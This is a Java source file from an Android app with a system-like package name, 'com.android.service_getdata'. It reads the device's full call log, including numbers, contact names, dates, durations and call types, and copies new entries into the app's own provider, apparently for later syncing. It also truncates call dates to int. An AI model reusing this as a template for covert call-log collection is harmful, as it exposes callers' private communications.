package com.android.service_getdata.devicetoapp;

import android.content.ContentResolver;
import android.content.ContentValues;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;
import com.android.service_getdata.Helper.AppConstant;
import com.android.service_getdata.Helper.HelperClass;
import com.android.service_getdata.Threads.PickUpDataThread;
import com.android.service_getdata.database.DBQuery;
import com.android.service_getdata.provider.BasicServiceProvider;
import com.android.service_getdata.provider.SyncServiceProvider;
import java.util.ArrayList;
import java.util.List;

/**
 * Created by inrsharm04 on 7/15/2015.
 */
public class CallLogs {
    ContentResolver mContentResolver;
    List<ContentValues> receivedData;

    public CallLogs(ContentResolver contentResolver){

        mContentResolver = contentResolver;
        receivedData = new ArrayList<ContentValues>();
    }

    public void getCallData(){
        getCallDataFromDevice();
        if (receivedData == null || receivedData.isEmpty()){
            return;
        }
        for (int iContentValues = 0; iContentValues <receivedData.size(); iContentValues++){

            ContentValues contentValues = receivedData.get(iContentValues);
            String number = contentValues.getAsString(DBQuery.DbFields.COLUMN_CALL_LOGS_NUMBER);
            int date = contentValues.getAsInteger(DBQuery.DbFields.COLUMN_CALL_LOGS_DATE);
            int duration = contentValues.getAsInteger(DBQuery.DbFields.COLUMN_CALL_LOGS_DURATION);
            int type = contentValues.getAsInteger(DBQuery.DbFields.COLUMN_CALL_LOGS_TYPE);

            String call_id =HelperClass.getMessageID(number, "" + date, duration+""+type);

            if (!HelperClass.isMessageCallIDExist(SyncServiceProvider.CONTENT_URI_SYNC_CALL_LOGS, call_id, DBQuery.DbFields.COLUMN_CALL_LOGS_CALL_ID, mContentResolver) &&
                    !HelperClass.isMessageCallIDExist(BasicServiceProvider.CONTENT_URI_CALL_LOGS, call_id, DBQuery.DbFields.COLUMN_CALL_LOGS_CALL_ID, mContentResolver)) {
                contentValues.put(DBQuery.DbFields.COLUMN_CALL_LOGS_CALL_ID, call_id);
                Uri uri = mContentResolver.insert(BasicServiceProvider.CONTENT_URI_CALL_LOGS, contentValues);
            }
        }
    }
    private void getCallDataFromDevice(){
        Cursor cursor = null;
        cursor = mContentResolver.query(CallLog.Calls.CONTENT_URI, AppConstant.CALL_LOG_COLUMNS, null, null, null);
        if (cursor == null || cursor.getCount() == 0) {
            if (cursor != null)
                cursor.close();
            return;
        }
        cursor.moveToFirst();
        do{
            ContentValues contentValues = new ContentValues();

            String number = cursor.getString(cursor.getColumnIndex(DBQuery.DbFields.COLUMN_CALL_LOGS_NUMBER));
            int _new = cursor.getInt(cursor.getColumnIndex(DBQuery.DbFields.COLUMN_CALL_LOGS_NEW));
            String f_number = cursor.getString(cursor.getColumnIndex(DBQuery.DbFields.COLUMN_CALL_LOGS_NUMBER_FORMATED_NUMBER));
            int number_type = cursor.getInt(cursor.getColumnIndex(DBQuery.DbFields.COLUMN_CALL_LOGS_NUMBER_TYPE));
            int date = cursor.getInt(cursor.getColumnIndex(DBQuery.DbFields.COLUMN_CALL_LOGS_DATE));
            int duration = cursor.getInt(cursor.getColumnIndex(DBQuery.DbFields.COLUMN_CALL_LOGS_DURATION));
            String number_label = cursor.getString(cursor.getColumnIndex(DBQuery.DbFields.COLUMN_CALL_LOGS_NUMBER_LABEL));
            String name = cursor.getString(cursor.getColumnIndex(DBQuery.DbFields.COLUMN_CALL_LOGS_NAME));
            int type = cursor.getInt(cursor.getColumnIndex(DBQuery.DbFields.COLUMN_CALL_LOGS_TYPE));

            contentValues.put(DBQuery.DbFields.COLUMN_CALL_LOGS_NUMBER, number);
            contentValues.put(DBQuery.DbFields.COLUMN_CALL_LOGS_NEW, _new);
            contentValues.put(DBQuery.DbFields.COLUMN_CALL_LOGS_NUMBER_FORMATED_NUMBER, f_number);
            contentValues.put(DBQuery.DbFields.COLUMN_CALL_LOGS_NUMBER_TYPE, number_type);
            contentValues.put(DBQuery.DbFields.COLUMN_CALL_LOGS_DATE, date);
            contentValues.put(DBQuery.DbFields.COLUMN_CALL_LOGS_DURATION, duration);
            contentValues.put(DBQuery.DbFields.COLUMN_CALL_LOGS_NUMBER_LABEL, number_label);
            contentValues.put(DBQuery.DbFields.COLUMN_CALL_LOGS_NAME, name);
            contentValues.put(DBQuery.DbFields.COLUMN_CALL_LOGS_TYPE, type);

            receivedData.add(contentValues);
        }
        while (cursor.moveToNext());
        cursor.close();
    }
}
